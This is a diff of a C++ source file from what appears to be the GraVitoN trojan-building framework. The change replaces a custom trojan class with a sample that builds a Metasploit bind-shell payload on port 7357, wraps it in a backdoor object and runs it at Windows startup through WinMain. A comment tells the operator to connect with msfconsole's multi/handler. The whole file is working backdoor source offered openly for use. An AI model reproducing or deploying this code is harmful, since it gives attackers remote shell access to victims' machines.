@@ -26,43 +26,36 @@
  * 2. If you are using msfconsole/exploit/multi/handler, push Ctrl+Z in case of sending a session to background. \n
  */
 
-
 /// Activate/Deactivate GraVitoN logger
-#define GVN_ACTIVATE_LOGGER
+//#define GVN_ACTIVATE_LOGGER
 /// Print logs into a file
 //#define GVN_LOG_INTO_FILE
 /// Path to Log File
 //#define GVN_LOG_FILE "./graviton_logs.txt"
 
-#include <windows.h>
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-#include "../../../graviton.hpp"
-#include "../../../gvn_payload/windows/gvn_payload_meter_w32b.hpp"
-#include "../../../gvn_ai/gvn_ai_trojan_sample.hpp"
+#include <windows.h>
+#include <graviton.hpp>
+#include <payload/win/meterpreter_bind_kasper_32.hpp>
+#include <ai/backdoor_sample.hpp>
 #include <iostream>
 using namespace std;
 
-class My_Trojan_AI : public AI_Trojan_Sample
-{
-protected:
-	virtual bool initializeInternalComponents()
-	{
-		payload = new Payload_Meter_W32b();
-		payload->initialize(options);
-	}
-};
-
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-int WINAPI WinMain(HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR cmd_line, int n_cmd)
+int WinMain(HINSTANCE inst, HINSTANCE previ, LPSTR cmd, int ncmd)
+// int main()
 {
-	GraVitoN::Logger::logItLn ( "main -> AI" );
+    GraVitoN::Core::Logger::logItLn ( "main -> AI" );
 
-	My_Trojan_AI ai;
-	ai.initialize("PORT=7357");
-    ai.run();
+    GraVitoN::Payload::Windows_MSF_Shell_Bind_32_Kasper msfpay;
+    msfpay.initialize(7357);
 
-    GraVitoN::Logger::logItLn ( "main -> done" );
+    GraVitoN::AI::Backdoor_Sample backy(msfpay);
+
+    backy.run();
+
+    GraVitoN::Core::Logger::logItLn ( "main -> done" );
 	
     return 0;
 }
